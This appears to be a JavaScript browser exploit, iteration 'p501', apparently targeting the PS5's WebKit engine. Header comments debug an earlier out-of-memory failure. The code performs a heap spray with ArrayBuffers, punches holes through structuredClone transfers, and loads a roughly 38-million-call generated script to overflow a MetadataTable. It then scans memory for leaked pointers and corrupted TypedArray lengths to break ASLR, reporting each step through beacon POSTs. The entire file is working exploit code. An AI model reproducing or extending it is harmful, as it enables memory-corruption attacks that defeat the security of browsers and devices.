// p501 — MetadataTable overflow ASLR leak via CHAINED CALLS
//
// V500 FIX: V500 died (no beacons after BLOB) — likely OOM during IIFE eager parse.
//   38M individual a(); statements = 38M AST nodes × ~64B = ~2.4GB → exceeds PS5 memory.
//
// SOLUTION: Use chained calls a()()()...() to reduce AST memory by ~50%.
//   Each chained call creates one op_call but costs only ~32B AST (no ExpressionStatementNode).
//   50 chained calls per statement → 38M op_calls in ~767K statements → ~1.24GB AST.
//
// Also: function declaration + explicit call (NOT IIFE) → lazy parse during script load.
//   typeof guard instead of if(0) → prevents bytecodeGenerator constant folding.
//
// Beacon prefix: V501-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V501-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // Phase 1: Spray ABs FIRST (must be in place before sweep)
  var BUF_SZ = 100112;
  var SPRAY_N = 300;
  var bufs = new Array(SPRAY_N);
  var views = [];

  for (var i = 0; i < SPRAY_N; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY', 'n=' + SPRAY_N + ',sz=' + BUF_SZ);

  // Phase 2: Transfer first half to create holes
  var xferred = 0;
  for (var i = 0; i < Math.floor(SPRAY_N / 2); i++) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      xferred++;
    } catch(e) {
      if (xferred === 0) { B('XFER-ERR', e.message); break; }
    }
    bufs[i] = null;
  }
  B('XFER', 'n=' + xferred);

  // Create views on surviving ABs
  for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      views.push(new Uint8Array(bufs[i]));
    }
  }
  B('VIEWS', 'n=' + views.length);

  // Phase 3: TypedArray targets
  var TARGET_N = 5000;
  var targets = new Array(TARGET_N);
  for (var i = 0; i < TARGET_N; i++) {
    targets[i] = new Uint8Array(16);
  }
  B('TARGETS', 'n=' + TARGET_N);

  // Phase 4: GC to free transferred backing stores
  setTimeout(function() {
    for (var g = 0; g < 10; g++) {
      var junk = [];
      for (var j = 0; j < 30000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC-DONE', '');

    var alive = 0;
    for (var v = 0; v < views.length; v++) {
      if (views[v] && views[v].length === BUF_SZ) alive++;
    }
    B('ALIVE', 'n=' + alive);

    // Phase 5: Build blob with CHAINED CALLS
    // a()()()...() × CHAIN per statement → CHAIN op_calls per statement
    var N = 38348816;
    var CHAIN = 50;
    var FULL_CHAINS = Math.floor(N / CHAIN); // 766976
    var REM = N - FULL_CHAINS * CHAIN;       // 16
    B('BUILD', 'N=' + N + ',chain=' + CHAIN + ',stmts=' + (FULL_CHAINS + (REM > 0 ? 1 : 0)));

    // Build one chain string: a()()...() × CHAIN
    var oneChain = 'a' + '()'.repeat(CHAIN) + ';';
    B('CHAIN-LEN', '' + oneChain.length);

    // Build blob parts to avoid huge single string
    var PART_SZ = 50000; // chains per part
    var nParts = Math.floor(FULL_CHAINS / PART_SZ);
    var remPart = FULL_CHAINS - nParts * PART_SZ;

    var partStr = oneChain.repeat(PART_SZ);
    B('PART-SZ', '' + Math.round(partStr.length / 1024) + 'KB');

    // Function declaration (NOT IIFE) — lazy parse during script load
    // typeof guard — prevents constant folding, bytecodes always emitted
    var parts = [];
    parts.push('window.__p501fn=function(a){if(typeof a==="string"){');
    for (var p = 0; p < nParts; p++) parts.push(partStr);
    if (remPart > 0) parts.push(oneChain.repeat(remPart));
    if (REM > 0) parts.push('a' + '()'.repeat(REM) + ';');
    parts.push('}window.__p501ok=1;};window.__p501ready=1;');
    partStr = null;
    oneChain = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    var blobMB = Math.round(blob.size / 1048576);
    B('BLOB', 'sz=' + blobMB + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onerror = function() { B('SCRIPT-ERR', ''); };

    sc.onload = function() {
      var ready = window.__p501ready ? 'YES' : 'NO';
      B('PARSED', ready);

      if (!window.__p501fn) {
        B('DONE', 'no-fn');
        return;
      }

      // Function is defined (lazy-parsed). Now CALL it to trigger finishCreation.
      B('CALLING', '');

      try {
        window.__p501fn(0); // typeof 0 !== "string" → body skipped
      } catch(e) {
        B('CALL-ERR', e.message ? e.message.substring(0, 60) : 'unk');
      }

      var ok = window.__p501ok;
      B('COMPILED', ok ? 'OK' : 'FAIL');

      if (!ok) {
        B('DONE', 'compile-fail');
        return;
      }

      // Phase 6: Scan
      setTimeout(doScan, 200);
    };

    document.head.appendChild(sc);
    sc.src = url;
  }, 500);

  function doScan() {
    B('SCAN-START', '');

    // SCAN A: Check spray ABs for non-zero bytes
    var hitBufs = 0;
    var totalNZ = 0;
    var leakedPtrs = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;

      var hasNZ = false;
      for (var q = 0; q < view.length && !hasNZ; q += 8) {
        if (view[q] !== 0 || view[q+1] !== 0 || view[q+2] !== 0 || view[q+3] !== 0) {
          hasNZ = true;
        }
      }
      if (!hasNZ) continue;
      hitBufs++;

      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }
      totalNZ += nz;
      B('HIT-' + vi, 'nz=' + nz + ',first=' + firstOff);

      if (hitBufs > 5) break;

      // Auto-detect entry alignment
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase += 4) {
        var hits = 0;
        for (var off = tryBase; off + 8 <= view.length; off += 112) {
          if (view[off] !== 0 || view[off+1] !== 0 || view[off+2] !== 0 || view[off+3] !== 0 ||
              view[off+4] !== 0 || view[off+5] !== 0 || view[off+6] !== 0 || view[off+7] !== 0) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

      // Extract thunk pointers at entryBase+24
      var ptrsDumped = 0;
      for (var eOff = bestBase; eOff + 112 <= view.length && ptrsDumped < 8; eOff += 112) {
        var pOff = eOff + 24;
        if (pOff + 8 > view.length) break;
        if (view[pOff] === 0 && view[pOff+1] === 0 && view[pOff+2] === 0 && view[pOff+3] === 0 &&
            view[pOff+4] === 0 && view[pOff+5] === 0 && view[pOff+6] === 0 && view[pOff+7] === 0) continue;
        var h = hex8(view, pOff);
        B('THUNK-' + ptrsDumped, 'off=' + pOff + ',val=0x' + h);
        if (leakedPtrs.length < 5) leakedPtrs.push(h);
        ptrsDumped++;
      }

      // m_bytecodeIndex at entryBase+68
      var idxDumped = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && idxDumped < 5; eOff += 112) {
        var iOff = eOff + 68;
        if (iOff + 4 > view.length) break;
        var val = u32(view, iOff);
        if (val !== 0) {
          B('IDX-' + idxDumped, 'off=' + iOff + ',val=' + val + ',hex=0x' + val.toString(16));
          idxDumped++;
        }
      }

      // Raw hex dump of first 256 bytes
      if (hitBufs === 1) {
        var chunks = [];
        for (var off = 0; off + 8 <= 256 && off + 8 <= view.length; off += 8) {
          if (view[off] !== 0 || view[off+1] !== 0 || view[off+2] !== 0 || view[off+3] !== 0 ||
              view[off+4] !== 0 || view[off+5] !== 0 || view[off+6] !== 0 || view[off+7] !== 0) {
            chunks.push(off + ':0x' + hex8(view, off));
          }
        }
        if (chunks.length > 0) B('RAW', chunks.slice(0, 15).join(' '));
      }
    }

    B('SPRAY-RESULT', 'hitBufs=' + hitBufs + ',totalNZ=' + totalNZ + ',ptrs=' + leakedPtrs.length);

    // SCAN B: TypedArray m_length corruption
    var leakN = 0, bigN = 0, errN = 0;
    var leaked = [];

    for (var i = 0; i < TARGET_N; i++) {
      try {
        var len = targets[i].length;
        if (len !== 16) {
          if (len > 281474976710656) { bigN++; }
          else if (len > 4096) {
            if (leaked.length < 10) leaked.push(len);
            leakN++;
          }
          targets[i] = null;
        }
      } catch(e) { errN++; targets[i] = null; }
    }

    B('TYPED-RESULT', 'leak=' + leakN + ',big=' + bigN + ',err=' + errN);

    if (leaked.length > 0) {
      for (var j = 0; j < Math.min(leaked.length, 5); j++) {
        try { B('TLEAK-' + j, '0x' + BigInt(leaked[j]).toString(16)); }
        catch(e) { B('TLEAK-' + j, '' + leaked[j]); }
      }
    }

    // Summary
    if (leakedPtrs.length > 0) {
      B('ASLR-SPRAY', 'ptr0=0x' + leakedPtrs[0]);
    }
    if (leakN > 0) {
      B('ASLR-TYPED', 'n=' + leakN);
    }
    if (leakedPtrs.length > 0 || leakN > 0) {
      B('ASLR-LEAK-CONFIRMED', '');
    } else if (hitBufs > 0) {
      B('SWEEP-HIT-NO-PTR', 'hitBufs=' + hitBufs);
    } else {
      B('NO-HIT', '');
    }

    B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length + ',typed=' + leakN);
  }
})();
